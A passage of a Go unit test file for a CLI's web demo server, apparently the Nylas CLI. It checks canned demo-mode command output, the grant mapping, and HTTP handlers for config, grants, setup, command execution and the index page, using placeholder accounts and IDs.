		{"scheduler bookings", []string{"Demo Mode", "Bookings", "UPCOMING"}},
		{"scheduler sessions", []string{"Demo Mode", "Sessions", "Active"}},
		{"scheduler pages", []string{"Demo Mode", "Scheduling Pages", "meet-with-alice"}},

		// Timezone commands
		{"timezone list", []string{"Demo Mode", "Time Zones", "America/New_York"}},
		{"timezone info", []string{"Demo Mode", "Time Zone Info", "DST"}},
		{"timezone convert", []string{"Demo Mode", "Time Conversion", "FROM", "TO"}},
		{"timezone find-meeting", []string{"Demo Mode", "Meeting Time Finder", "Best meeting times"}},
		{"timezone dst", []string{"Demo Mode", "DST Transitions", "Spring Forward", "Fall Back"}},

		// Webhook commands
		{"webhook list", []string{"Demo Mode", "Webhooks", "wh-001"}},
		{"webhook triggers", []string{"Demo Mode", "Webhook Triggers", "message.created"}},
		{"webhook test", []string{"Demo Mode", "Webhook Test", "200 OK"}},
		{"webhook server", []string{"Demo Mode", "Webhook Server", "localhost"}},

		// OTP commands
		{"otp get", []string{"Demo Mode", "OTP Code", "GitHub"}},
		{"otp watch", []string{"Demo Mode", "Watching for OTP"}},
		{"otp list", []string{"Demo Mode", "Configured OTP Accounts"}},
		{"otp messages", []string{"Demo Mode", "Recent OTP Messages", "GitHub"}},

		// Admin commands
		{"admin applications", []string{"Demo Mode", "Applications", "Production App"}},
		{"admin connectors", []string{"Demo Mode", "Connectors", "Google Workspace"}},
		{"admin credentials", []string{"Demo Mode", "Credentials", "oauth2"}},
		{"admin grants", []string{"Demo Mode", "Grants", "alice@example.com"}},

		// Notetaker commands
		{"notetaker list", []string{"Demo Mode", "Notetakers", "Team Standup"}},
		{"notetaker create", []string{"Demo Mode", "Create Notetaker", "nt-004"}},
		{"notetaker media", []string{"Demo Mode", "Notetaker Media", "Video Recording"}},

		// Version command
		{"version", []string{"nylas version dev", "demo mode"}},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := getDemoCommandOutput(tt.command)

			for _, expected := range tt.contains {
				if !strings.Contains(result, expected) {
					t.Errorf("getDemoCommandOutput(%q) missing %q in output:\n%s",
						tt.command, expected, result)
				}
			}
		})
	}
}

func TestGetDemoCommandOutput_EmptyCommand(t *testing.T) {
	t.Parallel()

	result := getDemoCommandOutput("")
	if !strings.Contains(result, "no command specified") {
		t.Errorf("Expected 'no command specified' for empty command, got: %s", result)
	}
}

func TestGetDemoCommandOutput_WhitespaceCommand(t *testing.T) {
	t.Parallel()

	result := getDemoCommandOutput("   ")
	if !strings.Contains(result, "no command specified") {
		t.Errorf("Expected 'no command specified' for whitespace command, got: %s", result)
	}
}

func TestGetDemoCommandOutput_UnknownCommand(t *testing.T) {
	t.Parallel()

	result := getDemoCommandOutput("unknown command here")
	if !strings.Contains(result, "Demo Mode - Command:") {
		t.Errorf("Expected fallback message for unknown command, got: %s", result)
	}
	if !strings.Contains(result, "sample output") {
		t.Errorf("Expected sample output message, got: %s", result)
	}
}

func TestGetDemoCommandOutput_CommandWithFlags(t *testing.T) {
	t.Parallel()

	// Commands with flags should still match on base command
	result := getDemoCommandOutput("email list --limit 10 --unread")
	if !strings.Contains(result, "Demo Mode") {
		t.Errorf("Expected demo output for command with flags, got: %s", result)
	}
}

// =============================================================================
// grantFromDomain Tests
// =============================================================================

func TestGrantFromDomain(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		input    domain.GrantInfo
		expected Grant
	}{
		{
			name: "google provider",
			input: domain.GrantInfo{
				ID:       "grant-123",
				Email:    "test@example.com",
				Provider: domain.ProviderGoogle,
			},
			expected: Grant{
				ID:       "grant-123",
				Email:    "test@example.com",
				Provider: "google",
			},
		},
		{
			name: "microsoft provider",
			input: domain.GrantInfo{
				ID:       "grant-456",
				Email:    "user@work.com",
				Provider: domain.ProviderMicrosoft,
			},
			expected: Grant{
				ID:       "grant-456",
				Email:    "user@work.com",
				Provider: "microsoft",
			},
		},
		{
			name: "empty fields",
			input: domain.GrantInfo{
				ID:       "",
				Email:    "",
				Provider: "",
			},
			expected: Grant{
				ID:       "",
				Email:    "",
				Provider: "",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := grantFromDomain(tt.input)

			if result.ID != tt.expected.ID {
				t.Errorf("ID: got %q, want %q", result.ID, tt.expected.ID)
			}
			if result.Email != tt.expected.Email {
				t.Errorf("Email: got %q, want %q", result.Email, tt.expected.Email)
			}
			if result.Provider != tt.expected.Provider {
				t.Errorf("Provider: got %q, want %q", result.Provider, tt.expected.Provider)
			}
		})
	}
}

// =============================================================================
// Demo Mode Handler Tests
// =============================================================================

func TestHandleConfigStatus_DemoMode(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	req := httptest.NewRequest(http.MethodGet, "/api/config/status", nil)
	w := httptest.NewRecorder()

	server.handleConfigStatus(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	var resp ConfigStatusResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !resp.Configured {
		t.Error("Expected Configured to be true in demo mode")
	}
	if resp.Region != "us" {
		t.Errorf("Expected Region 'us', got %q", resp.Region)
	}
	if resp.ClientID != "demo-client-id" {
		t.Errorf("Expected ClientID 'demo-client-id', got %q", resp.ClientID)
	}
	if !resp.HasAPIKey {
		t.Error("Expected HasAPIKey to be true in demo mode")
	}
	if resp.GrantCount != 3 {
		t.Errorf("Expected GrantCount 3, got %d", resp.GrantCount)
	}
	if resp.DefaultGrant != "demo-grant-001" {
		t.Errorf("Expected DefaultGrant 'demo-grant-001', got %q", resp.DefaultGrant)
	}
}

func TestHandleListGrants_DemoMode(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	req := httptest.NewRequest(http.MethodGet, "/api/grants", nil)
	w := httptest.NewRecorder()

	server.handleListGrants(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	var resp GrantsResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if len(resp.Grants) != 3 {
		t.Errorf("Expected 3 demo grants, got %d", len(resp.Grants))
	}
	if resp.DefaultGrant != "demo-grant-001" {
		t.Errorf("Expected DefaultGrant 'demo-grant-001', got %q", resp.DefaultGrant)
	}

	// Verify grant data
	if resp.Grants[0].Email != "alice@example.com" {
		t.Errorf("Expected first grant email 'alice@example.com', got %q", resp.Grants[0].Email)
	}
}

func TestHandleSetDefaultGrant_DemoMode(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	body, _ := json.Marshal(SetDefaultGrantRequest{GrantID: "demo-grant-002"})
	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	var resp SetDefaultGrantResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !resp.Success {
		t.Error("Expected success to be true in demo mode")
	}
	if !strings.Contains(resp.Message, "demo mode") {
		t.Errorf("Expected message to mention demo mode, got: %s", resp.Message)
	}
}

func TestHandleConfigSetup_DemoMode(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	body, _ := json.Marshal(SetupRequest{APIKey: "test-key", Region: "us"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !resp.Success {
		t.Error("Expected success to be true in demo mode")
	}
	if !strings.Contains(resp.Message, "Demo mode") {
		t.Errorf("Expected message to mention demo mode, got: %s", resp.Message)
	}
	if resp.ClientID != "demo-client-id" {
		t.Errorf("Expected ClientID 'demo-client-id', got %q", resp.ClientID)
	}
	if len(resp.Applications) != 1 {
		t.Errorf("Expected 1 demo application, got %d", len(resp.Applications))
	}
	if len(resp.Grants) != 3 {
		t.Errorf("Expected 3 demo grants, got %d", len(resp.Grants))
	}
}

func TestHandleExecCommand_DemoMode(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	tests := []struct {
		name     string
		command  string
		contains string
	}{
		{"email list", "email list", "Demo Mode"},
		{"calendar events", "calendar events", "Demo Mode"},
		{"auth status", "auth status", "Demo Mode"},
		{"version", "version", "demo mode"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body, _ := json.Marshal(ExecRequest{Command: tt.command})
			req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			server.handleExecCommand(w, req)

			if w.Code != http.StatusOK {
				t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
			}

			var resp ExecResponse
			if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
				t.Fatalf("Failed to decode response: %v", err)
			}

			if resp.Error != "" {
				t.Errorf("Unexpected error: %s", resp.Error)
			}
			if !strings.Contains(resp.Output, tt.contains) {
				t.Errorf("Expected output to contain %q, got: %s", tt.contains, resp.Output)
			}
		})
	}
}

// =============================================================================
// buildPageData Tests
// =============================================================================

func TestBuildPageData_DemoMode(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")
	data := server.buildPageData()

	if !data.DemoMode {
		t.Error("Expected DemoMode to be true")
	}
	if !data.Configured {
		t.Error("Expected Configured to be true in demo mode")
	}
	if data.ClientID != "demo-client-id" {
		t.Errorf("Expected ClientID 'demo-client-id', got %q", data.ClientID)
	}
	if data.Region != "us" {
		t.Errorf("Expected Region 'us', got %q", data.Region)
	}
	if !data.HasAPIKey {
		t.Error("Expected HasAPIKey to be true")
	}
	if data.DefaultGrant != "demo-grant-001" {
		t.Errorf("Expected DefaultGrant 'demo-grant-001', got %q", data.DefaultGrant)
	}
	if len(data.Grants) != 3 {
		t.Errorf("Expected 3 grants, got %d", len(data.Grants))
	}
	if data.DefaultGrantEmail != "alice@example.com" {
		t.Errorf("Expected DefaultGrantEmail 'alice@example.com', got %q", data.DefaultGrantEmail)
	}

	// Verify commands are loaded
	if len(data.Commands.Auth) == 0 {
		t.Error("Expected commands to be loaded")
	}
}

// =============================================================================
// Demo Helper Function Tests
// =============================================================================

func TestDemoGrants(t *testing.T) {
	t.Parallel()

	grants := demoGrants()

	if len(grants) != 3 {
		t.Errorf("Expected 3 demo grants, got %d", len(grants))
	}

	// Check first grant
	if grants[0].ID != "demo-grant-001" {
		t.Errorf("Expected first grant ID 'demo-grant-001', got %q", grants[0].ID)
	}
	if grants[0].Email != "alice@example.com" {
		t.Errorf("Expected first grant email 'alice@example.com', got %q", grants[0].Email)
	}
	if grants[0].Provider != "google" {
		t.Errorf("Expected first grant provider 'google', got %q", grants[0].Provider)
	}

	// Check second grant has different provider
	if grants[1].Provider != "microsoft" {
		t.Errorf("Expected second grant provider 'microsoft', got %q", grants[1].Provider)
	}
}

func TestDemoDefaultGrant(t *testing.T) {
	t.Parallel()

	result := demoDefaultGrant()
	if result != "demo-grant-001" {
		t.Errorf("Expected 'demo-grant-001', got %q", result)
	}
}

// =============================================================================
// NewDemoServer Tests
// =============================================================================

func TestNewDemoServer(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":8080")

	if server == nil {
		t.Fatal("NewDemoServer returned nil")
	}
	if server.addr != ":8080" {
		t.Errorf("Expected addr ':8080', got %q", server.addr)
	}
	if !server.demoMode {
		t.Error("Expected demoMode to be true")
	}
	if server.templates == nil {
		t.Error("Expected templates to be loaded")
	}
	// Demo mode doesn't use real stores
	if server.configSvc != nil {
		t.Error("Expected configSvc to be nil in demo mode")
	}
	if server.grantStore != nil {
		t.Error("Expected grantStore to be nil in demo mode")
	}
}

// =============================================================================
// handleIndex Tests
// =============================================================================

func TestHandleIndex_RootPath(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	w := httptest.NewRecorder()

	server.handleIndex(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d for root path, got %d", http.StatusOK, w.Code)
	}

	contentType := w.Header().Get("Content-Type")
	if !strings.Contains(contentType, "text/html") {
		t.Errorf("Expected Content-Type to contain 'text/html', got %q", contentType)
	}
}

func TestHandleIndex_NonRootPath(t *testing.T) {
	t.Parallel()

	server := NewDemoServer(":0")

	req := httptest.NewRequest(http.MethodGet, "/some/other/path", nil)
	w := httptest.NewRecorder()

	server.handleIndex(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected status %d for non-root path, got %d", http.StatusNotFound, w.Code)
	}
}

// =============================================================================
// limitedBody Tests
// =============================================================================

func TestLimitedBody(t *testing.T) {
	t.Parallel()

	// Test with small body (should work)
	smallBody := strings.NewReader(`{"command": "email list"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/exec", smallBody)
	w := httptest.NewRecorder()

	reader := limitedBody(w, req)
	data, err := io.ReadAll(reader)
	if err != nil {
		t.Fatalf("Failed to read limited body: %v", err)
	}
	if len(data) == 0 {
		t.Error("Expected data from limited body")
	}
}
